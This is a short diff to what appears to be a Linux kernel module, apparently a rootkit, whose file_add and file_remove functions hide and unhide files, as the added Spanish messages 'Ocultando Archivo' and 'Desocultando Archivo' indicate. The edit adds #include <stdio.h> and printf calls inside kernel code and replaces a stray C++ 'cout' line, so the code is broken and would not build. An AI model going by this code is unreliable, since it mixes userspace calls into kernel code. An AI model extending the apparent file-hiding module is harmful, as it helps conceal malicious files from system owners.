@@ -38,6 +38,10 @@
 #include <linux/delay.h>
 #include <linux/version.h>
 
+//Edit
+#include <stdio.h>
+//Edit
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
 
@@ -512,6 +516,7 @@ LIST_HEAD(file_list);
 
 int file_add(const char *name)
 {
+    printf("Ocultando Archivo 1");
     struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);
 
     if (!f) {
@@ -541,7 +546,7 @@ int file_add(const char *name)
 
 void file_remove(const char *name)
 {
-    cout << "Borrando el archivo";
+    printf("Desocultando Archivo");
     struct file_entry *f, *tmp;
 
     list_for_each_entry_safe(f, tmp, &file_list, list) {
